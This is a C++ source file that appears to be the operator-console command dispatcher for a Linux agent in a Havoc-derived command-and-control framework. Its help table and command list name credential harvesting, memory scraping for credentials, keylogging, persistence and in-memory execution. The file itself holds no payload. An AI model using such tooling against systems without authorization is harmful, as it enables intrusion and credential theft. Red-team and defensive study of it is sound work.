#include <global.hpp>

#include <Mugen/Tengu/TenguCmdDispatch.h>
#include <UserInterface/Widgets/DemonInteracted.h>
#include <Util/ColorText.h>
#include <Mugen/Packager.hpp>

#include <filesystem>

using namespace MugenNamespace::MugenSpace;
using namespace MugenNamespace::UserInterface::Widgets;
using namespace Util;

auto TenguCommands::SetTenguConsole( DemonInteracted* pInteracted ) -> void
{
    TenguConsole = pInteracted;
}

auto TenguCommands::ConsoleInfo( bool Show, QString TaskID, const QString& text ) -> QString
{
    if ( TaskID.isEmpty() )
        TaskID = Util::gen_random( 8 ).c_str();

    if ( ! Show )
    {
        auto msg = ColorText::Cyan( "[*]" ) + " " +
                   ColorText::Comment( "[" + TaskID + "]" ) + " " +
                   ColorText::Cyan( text.toHtmlEscaped() );
        TenguConsole->Console->append( msg );
    }
    return TaskID;
}

auto TenguCommands::ConsoleError( const QString& text ) -> void
{
    TenguConsole->Console->append( "" );
    TenguConsole->Console->append( Prompt );
    TenguConsole->Console->append( ColorText::Red( "[!]" ) + " " + text.toHtmlEscaped() );
}

// SendTask sends the raw command text to the teamserver via the Teamserver CommandID path.
// The server-side TenguTeamserverTaskPrepare then parses and queues the job.
auto TenguCommands::SendTask( const QString& TaskID, const QString& command ) -> void
{
    auto Body = Util::Packager::Body_t {
        .SubEvent = Util::Packager::Session::SendCommand,
        .Info = {
            { "TaskID",      TaskID.toStdString() },
            { "DemonID",     AgentID.toStdString() },
            { "CommandID",   "Teamserver" },
            { "CommandLine", command.toStdString() },
            { "Command",     command.toStdString() },
        },
    };

    NewPackageCommand( Teamserver, Body );
}

// DispatchCommand handles all operator input for Tengu sessions.
// All commands are forwarded as raw text to the teamserver for server-side parsing.
auto TenguCommands::DispatchCommand( bool Send, QString TaskID, const QString& commandline ) -> bool
{
    if ( commandline.isEmpty() )
        return false;

    auto parts = commandline.trimmed().split( " " );
    auto cmd   = parts[0].toLower();

    // Local info display - does not send to agent.
    if ( cmd == "info" )
    {
        for ( const auto& s : MugenX::Teamserver.Sessions )
        {
            if ( s.Name != AgentID )
                continue;

            auto row = []( const QString& key, const QString& val ) -> QString {
                return "  " + ColorText::Cyan( key.leftJustified( 14 ) ) + "  " + val.toHtmlEscaped();
            };

            TenguConsole->Console->append( "" );
            TenguConsole->Console->append( Prompt );
            TenguConsole->Console->append( ColorText::Pink( "Session Info - " + s.Name ) );
            TenguConsole->Console->append( row( "User",      s.User ) );
            TenguConsole->Console->append( row( "Hostname",  s.Computer ) );
            TenguConsole->Console->append( row( "Domain",    s.Domain.isEmpty() ? "-" : s.Domain ) );
            TenguConsole->Console->append( row( "OS",        s.OS + ( s.OSArch.isEmpty() ? "" : " (" + s.OSArch + ")" ) ) );
            TenguConsole->Console->append( row( "Process",   s.Process + " [" + s.PID + "]" ) );
            TenguConsole->Console->append( row( "Arch",      s.Arch ) );
            TenguConsole->Console->append( row( "External",  s.External ) );
            TenguConsole->Console->append( row( "Internal",  s.Internal ) );
            TenguConsole->Console->append( row( "Listener",  s.Listener ) );
            TenguConsole->Console->append( row( "Sleep",     QString::number( s.SleepDelay ) + "s  jitter " + QString::number( s.SleepJitter ) + "%" ) );
            TenguConsole->Console->append( row( "First seen", s.First ) );
            TenguConsole->Console->append( row( "Last seen",  s.Last ) );
            TenguConsole->Console->append( "" );
            return true;
        }
        ConsoleError( "Session not found." );
        return false;
    }

    // Local help display - does not send to agent.
    if ( cmd == "help" )
    {
        auto row = []( const QString& name, const QString& type, const QString& desc ) -> QString {
            return "  " + name.leftJustified( 25 ) + type.leftJustified( 13 ) + desc;
        };

        TenguConsole->Console->append( "" );
        TenguConsole->Console->append( Prompt );
        TenguConsole->Console->append( "Tengu Commands" );
        TenguConsole->Console->append( "==============" );
        TenguConsole->Console->append( "" );
        TenguConsole->Console->append( row( "Command", "Type", "Description" ) );
        TenguConsole->Console->append( row( "-------", "-------", "-----------" ) );
        TenguConsole->Console->append( row( "arp",            "Command", "show ARP table" ) );
        TenguConsole->Console->append( row( "cat",            "Command", "display content of a file" ) );
        TenguConsole->Console->append( row( "cd",             "Command", "change working directory" ) );
        TenguConsole->Console->append( row( "chmod",          "Command", "change file permissions" ) );
        TenguConsole->Console->append( row( "cp",             "Command", "copy file" ) );
        TenguConsole->Console->append( row( "download",       "Command", "download file from target" ) );
        TenguConsole->Console->append( row( "env",            "Command", "list environment variables" ) );
        TenguConsole->Console->append( row( "exit",           "Command", "terminate the agent" ) );
        TenguConsole->Console->append( row( "help",           "Command", "show this help message" ) );
        TenguConsole->Console->append( row( "id",             "Command", "show current user identity" ) );
        TenguConsole->Console->append( row( "ifconfig",       "Command", "show network interfaces" ) );
        TenguConsole->Console->append( row( "info",           "Command", "show session info (local, no task)" ) );
        TenguConsole->Console->append( row( "inline-execute", "Command", "execute ELF BOF in-process" ) );
        TenguConsole->Console->append( row( "kill",           "Command", "kill process by PID" ) );
        TenguConsole->Console->append( row( "ls",             "Command", "list directory contents" ) );
        TenguConsole->Console->append( row( "mkdir",          "Command", "create directory (recursive)" ) );
        TenguConsole->Console->append( row( "netstat",        "Command", "show TCP/TCP6 connections" ) );
        TenguConsole->Console->append( row( "portscan",       "Command", "TCP connect scan (host or CIDR, port list/range)" ) );
        TenguConsole->Console->append( row( "persist",        "Command", "persistence (cron|systemd|bash) <path>" ) );
        TenguConsole->Console->append( row( "privesc",         "Command", "privilege escalation recon: writable PATH, sudo -l, SUID/SGID, capabilities" ) );
        TenguConsole->Console->append( row( "procdump",       "Command", "scan process memory for credentials (pid or all)" ) );
        TenguConsole->Console->append( row( "ps",             "Command", "list running processes" ) );
        TenguConsole->Console->append( row( "pwd",            "Command", "print working directory" ) );
        TenguConsole->Console->append( row( "rm",             "Command", "remove file or directory" ) );
        TenguConsole->Console->append( row( "route",          "Command", "show routing table" ) );
        TenguConsole->Console->append( row( "screenshot",     "Command", "capture screen (scrot/grim)" ) );
        TenguConsole->Console->append( row( "shell",          "Command", "execute a shell command" ) );
        TenguConsole->Console->append( row( "harvest",         "Command", "collect credentials: SSH keys, history, cloud tokens, etc." ) );
        TenguConsole->Console->append( row( "keylog",          "Command", "capture keystrokes for N seconds (default 30)" ) );
        TenguConsole->Console->append( row( "memfd",           "Command", "execute ELF in-memory via memfd_create (no disk write)" ) );
        TenguConsole->Console->append( row( "rportfwd",        "Module",  "reverse port forward (add/rm/list)" ) );
        TenguConsole->Console->append( row( "pivot tcp",      "Module",  "TCP pivot server: listen <port> | disconnect <id>" ) );
        TenguConsole->Console->append( row( "whoami",         "Command", "identity, groups, caps, session info" ) );
        TenguConsole->Console->append( row( "sleep",          "Command", "set sleep delay and jitter" ) );
        TenguConsole->Console->append( row( "upload",         "Command", "upload file to target" ) );
        TenguConsole->Console->append( row( "socks5",         "Module",  "SOCKS5 proxy (start/stop)" ) );
        TenguConsole->Console->append( row( "task",           "Module",  "task manager (list/clear)" ) );

        // Python-registered Tengu commands
        auto hasPython = false;
        for ( auto& PyCmd : MugenX::Teamserver.RegisteredCommands )
        {
            if ( PyCmd.Agent != "Tengu" )
                continue;
            if ( ! hasPython )
            {
                TenguConsole->Console->append( "" );
                TenguConsole->Console->append( "Python Commands" );
                TenguConsole->Console->append( "===============" );
                TenguConsole->Console->append( "" );
                TenguConsole->Console->append( row( "Command", "Type", "Description" ) );
                TenguConsole->Console->append( row( "-------", "-------", "-----------" ) );
                hasPython = true;
            }
            auto cmdName = PyCmd.Module.empty()
                ? QString( PyCmd.Command.c_str() )
                : QString( PyCmd.Module.c_str() ) + " " + QString( PyCmd.Command.c_str() );
            TenguConsole->Console->append( row( cmdName, "Command", QString( PyCmd.Help.c_str() ) ) );
        }

        TenguConsole->Console->append( "" );
        return true;
    }

    // Check Python-registered Tengu commands before the built-in list.
    for ( auto& PyCmd : MugenX::Teamserver.RegisteredCommands )
    {
        if ( PyCmd.Agent != "Tengu" )
            continue;

        bool match    = false;
        int  argStart = 1;

        if ( ! PyCmd.Module.empty() )
        {
            if ( parts.size() >= 2 &&
                 parts[0].compare( PyCmd.Module.c_str(), Qt::CaseInsensitive ) == 0 &&
                 parts[1].compare( PyCmd.Command.c_str(), Qt::CaseInsensitive ) == 0 )
            {
                match    = true;
                argStart = 2;
            }
        }
        else
        {
            if ( parts[0].compare( PyCmd.Command.c_str(), Qt::CaseInsensitive ) == 0 )
            {
                match    = true;
                argStart = 1;
            }
        }

        if ( ! match )
            continue;

        if ( ! Send )
            return true;

        int       nargs    = parts.size() - argStart + 1;
        PyObject* FuncArgs = PyTuple_New( nargs );

        PyTuple_SetItem( FuncArgs, 0, PyUnicode_FromString( AgentID.toStdString().c_str() ) );
        for ( int i = argStart; i < parts.size(); i++ )
            PyTuple_SetItem( FuncArgs, i - argStart + 1, PyUnicode_FromString( parts[i].toStdString().c_str() ) );

        auto savedPath = std::string();
        if ( ! PyCmd.Path.empty() )
        {
            savedPath = std::filesystem::current_path();
            std::filesystem::current_path( PyCmd.Path );
        }

        PyObject* Return = PyObject_CallObject( (PyObject*) PyCmd.Function, FuncArgs );

        if ( ! savedPath.empty() )
            std::filesystem::current_path( savedPath );

        if ( Return == nullptr && PyErr_Occurred() )
        {
            PyErr_PrintEx( 0 );
            PyErr_Clear();
            ConsoleError( "Python command failed: " + parts[0] );
        }

        Py_CLEAR( FuncArgs );
        Py_XDECREF( Return );
        return true;
    }

    if ( cmd == "havoc" )
    {
        auto art = [&]( const QString& hex, const QString& line ) {
            TenguConsole->Console->append(
                "<span style=\"color:" + hex + ";\">" +
                QString(line).replace( " ", "&nbsp;" ) +
                "</span>"
            );
        };
        TenguConsole->Console->append( "" );
        art( ColorText::Colors::Hex::Purple, "  #   #  ###  #   #  ###   ###  " );
        art( ColorText::Colors::Hex::Purple, "  #   # #   # #   # #   # #     " );
        art( ColorText::Colors::Hex::Purple, "  ##### ##### #   # #   # #     " );
        art( ColorText::Colors::Hex::Purple, "  #   # #   #  # #  #   # #     " );
        art( ColorText::Colors::Hex::Purple, "  #   # #   #   #    ###   ###  " );
        TenguConsole->Console->append( "" );
        TenguConsole->Console->append( ColorText::Comment( "  Mugen is built on the shoulders of giants." ) );
        TenguConsole->Console->append( ColorText::Comment( "  Havoc (GPL-3.0, December 2025) laid the foundation." ) );
        TenguConsole->Console->append( ColorText::Comment( "  No paywalls, no closed doors. The spirit lives on." ) );
        TenguConsole->Console->append( "" );
        return true;
    }

    if ( cmd == "5pider" || cmd == "c5pider" )
    {
        auto art = [&]( const QString& hex, const QString& line ) {
            TenguConsole->Console->append(
                "<span style=\"color:" + hex + ";\">" +
                QString(line).replace( " ", "&nbsp;" ) +
                "</span>"
            );
        };
        TenguConsole->Console->append( "" );
        art( ColorText::Colors::Hex::Pink, "  ###  ###  ###  ###  ###  ###" );
        art( ColorText::Colors::Hex::Pink, "  #    # #   #   # #  #    # #" );
        art( ColorText::Colors::Hex::Pink, "  ###  ###   #   # #  ##   ## " );
        art( ColorText::Colors::Hex::Pink, "    #  #     #   # #  #    # #" );
        art( ColorText::Colors::Hex::Pink, "  ###  #    ###  ###  ###  # #" );
        TenguConsole->Console->append( "" );
        TenguConsole->Console->append( ColorText::Comment( "  @C5pider - architect of Havoc, father of Demon." ) );
        TenguConsole->Console->append( ColorText::Comment( "  His work lives on in every shellcode we execute." ) );
        TenguConsole->Console->append( ColorText::Comment( "  Mugen would not exist without him." ) );
        TenguConsole->Console->append( "" );
        return true;
    }

    // Validate known built-in commands before sending.
    static const QStringList KnownCmds = {
        "info", "shell", "sleep", "exit", "pwd", "ls", "cd", "download", "task",
        "upload", "cat", "mkdir", "rm", "ps", "id", "env", "ifconfig",
        "chmod", "cp", "kill", "socks5", "inline-execute",
        "netstat", "arp", "route", "persist", "screenshot", "whoami", "keylog",
        "harvest", "memfd", "portscan", "privesc", "procdump", "rportfwd", "pivot"
    };

    if ( ! KnownCmds.contains( cmd ) )
    {
        ConsoleError( "Unknown command: " + cmd + ". Type 'help' for available commands." );
        return false;
    }

    if ( cmd == "shell" && parts.size() < 2 )
    {
        ConsoleError( "Usage: shell <command>" );
        return false;
    }

    if ( cmd == "cd" && parts.size() < 2 )
    {
        ConsoleError( "Usage: cd <path>" );
        return false;
    }

    if ( cmd == "cat" && parts.size() < 2 )
    {
        ConsoleError( "Usage: cat <path>" );
        return false;
    }

    if ( cmd == "mkdir" && parts.size() < 2 )
    {
        ConsoleError( "Usage: mkdir <path>" );
        return false;
    }

    if ( cmd == "rm" && parts.size() < 2 )
    {
        ConsoleError( "Usage: rm [-r] <path>" );
        return false;
    }

    if ( cmd == "cp" && parts.size() < 3 )
    {
        ConsoleError( "Usage: cp <src> <dst>" );
        return false;
    }

    if ( cmd == "chmod" && parts.size() < 3 )
    {
        ConsoleError( "Usage: chmod <octal_mode> <path>" );
        return false;
    }

    if ( cmd == "download" && parts.size() < 2 )
    {
        ConsoleError( "Usage: download <remote_path>" );
        return false;
    }

    if ( cmd == "upload" && parts.size() < 3 )
    {
        ConsoleError( "Usage: upload <local_path> <remote_path>" );
        return false;
    }

    if ( cmd == "kill" && parts.size() < 2 )
    {
        ConsoleError( "Usage: kill <pid>" );
        return false;
    }

    if ( cmd == "pivot" )
    {
        if ( parts.size() < 2 || parts[1] != "tcp" )
        {
            ConsoleError( "Usage: pivot tcp <listen <port>|disconnect <id>>" );
            return false;
        }
        if ( parts.size() < 3 || ( parts[2] != "listen" && parts[2] != "disconnect" ) )
        {
            ConsoleError( "Usage: pivot tcp <listen <port>|disconnect <id>>" );
            return false;
        }
        if ( parts.size() < 4 )
        {
            ConsoleError( parts[2] == "listen" ? "Usage: pivot tcp listen <port>" : "Usage: pivot tcp disconnect <id>" );
            return false;
        }
    }

    if ( cmd == "socks5" && ( parts.size() < 2 || ( parts[1] != "start" && parts[1] != "stop" ) ) )
    {
        ConsoleError( "Usage: socks5 <start [port]|stop>" );
        return false;
    }

    if ( cmd == "task" && ( parts.size() < 2 || ( parts[1] != "list" && parts[1] != "clear" ) ) )
    {
        ConsoleError( "Usage: task <list|clear>" );
        return false;
    }

    if ( cmd == "persist" )
    {
        if ( parts.size() < 3 )
        {
            ConsoleError( "Usage: persist <cron|systemd|bash> <payload_path> [cron_interval]" );
            return false;
        }
        if ( parts[1] != "cron" && parts[1] != "systemd" && parts[1] != "bash" )
        {
            ConsoleError( "persist: unknown method '" + parts[1] + "'. Use: cron, systemd, bash" );
            return false;
        }
    }

    TaskID = ConsoleInfo( Send, TaskID, "Tengu >> " + commandline );
    CommandInputList[ TaskID ] = commandline;

    if ( Send )
        SendTask( TaskID, commandline );

    return true;
}
